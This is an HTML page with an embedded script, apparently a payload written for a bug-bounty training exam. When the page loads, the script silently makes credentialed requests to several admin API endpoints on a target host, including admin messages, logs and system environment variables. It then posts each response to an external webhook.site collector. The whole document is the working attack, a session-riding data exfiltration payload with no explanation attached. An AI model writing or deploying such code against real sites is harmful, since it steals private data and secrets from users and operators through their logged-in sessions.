<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/6b0b4772-6bdc-417e-a83a-2403f5690ef1";
        const base = "https://api-bugbounty-exam.hashacademy.co";

        const targets = [
            "/api/admin/messages",              // List all messages
            "/api/admin/messages/all",          // Alternative list path
            "/api/admin/contact/messages",      // Another common admin path
            "/api/admin/logs?limit=100",        // Try logs again without v1
            "/api/admin/system/env"             // Check environment variables
        ];

        targets.forEach(path => {
            fetch(base + path, { credentials: "include" })
                .then(r => r.text())
                .then(data => {
                    fetch(webh, {
                        method: "POST",
                        body: JSON.stringify({ path: path, data: data })
                    });
                }).catch(e => {});
        });
    </script>
</body>
</html>
